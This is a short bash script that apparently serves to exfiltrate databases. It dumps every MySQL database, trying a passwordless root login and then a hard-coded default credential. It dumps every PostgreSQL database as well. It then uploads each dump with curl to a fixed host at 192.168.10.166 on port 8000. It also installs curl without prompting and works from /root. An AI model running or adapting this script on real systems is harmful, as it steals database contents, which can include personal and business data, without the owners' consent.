#!/bin/bash -x

command -v mysqldump >/dev/null || command -v pg_dumpall >/dev/null || exit

DEFAULT_CRED='redacted'
UPLOAD_HOST="192.168.10.166"
DNF="dnf -y install"
YUM="yum -y install"

if command -v apt >/dev/null; then
    export DEBIAN_FRONTEND=noninteractive
    apt update
	apt -yqq install curl
elif command -v dnf >/dev/null; then
    $DNF curl
elif command -v yum >/dev/null; then
	$YUM curl
fi

cd /root

if command -v mysqldump >/dev/null; then
    mysqldump -u root --all-databases > mysql-dump-$(hostname).sql || mysqldump -u root --password="$DEFAULT_CRED" --all-databases > mysql-dump-$(hostname).sql
    curl -X POST http://$UPLOAD_HOST:8000/upload -F "files=@mysql-dump-$(hostname).sql"
fi

if command -v pg_dumpall >/dev/null; then
    pg_dumpall > psql-dump-$(hostname).sql
    curl -X POST http://$UPLOAD_HOST:8000/upload -F "files=@psql-dump-$(hostname).sql"
fi